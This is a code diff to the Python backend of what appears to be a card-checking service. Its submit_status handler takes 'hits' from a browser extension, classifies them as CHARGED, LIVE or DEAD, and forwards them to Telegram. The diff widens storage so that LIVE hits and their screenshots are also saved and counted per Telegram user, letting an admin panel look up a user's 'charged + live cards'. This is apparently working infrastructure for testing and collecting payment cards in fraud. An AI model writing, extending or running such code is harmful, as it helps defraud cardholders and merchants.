@@ -375,14 +375,14 @@ async def submit_status(
         invoice_number=body.invoiceNumber,
         ip=_extract_client_ip(request),
         ip_country=(request.headers.get("cf-ipcountry") or request.headers.get("x-country") or None),
-        screenshot_b64=body.screenshot if is_charged else None,  # only store screenshot for charged
+        screenshot_b64=body.screenshot if (is_charged or is_live) else None,  # store screenshot for charged + live
         submit_id=body.submitId,
         from_outdated_ext=from_outdated_ext,
         ext_sent_version=outdated_sent_v if from_outdated_ext else None,
     )
-    # PERMANENT STORAGE POLICY: only CHARGED hits are saved to the DB. The admin
-    # dashboard therefore shows charged only (no LIVE/DEAD). LIVE hits are still
-    # forwarded to Telegram as notifications below, but are NOT persisted.
+    # PERMANENT STORAGE POLICY (v4.0): CHARGED and LIVE hits are saved to the DB
+    # (keyed by telegram_id) so the admin panel can look up a user's charged +
+    # live cards. DEAD/declined/error are still NOT persisted (notification-only).
     #
     # DURABILITY ORDERING: for CHARGED hits the actual DB insert is DEFERRED until
     # AFTER the durable outbox entries are written (see the forward section). This
@@ -399,6 +399,8 @@ async def submit_status(
         inc = {"hit_count": 1}
         if is_charged:
             inc["charged_count"] = 1
+        elif is_live:
+            inc["live_count"] = 1
         await db.users.update_one({"telegram_id": user.telegram_id}, {"$inc": inc})
     except Exception as _e:
         log.warning("user counter update failed (hit already saved): %s", _e)
@@ -538,7 +540,7 @@ async def submit_status(
     # the insert AFTER the enqueues means a crash between the two can only ever
     # leave delivery work WITHOUT a dashboard row (the message still reaches
     # Telegram) — never a dashboard row without delivery work.
-    if is_charged:
+    if is_charged or is_live:
         try:
             ins = await db.hits.insert_one(hit.to_mongo())
             hit_id = str(ins.inserted_id)
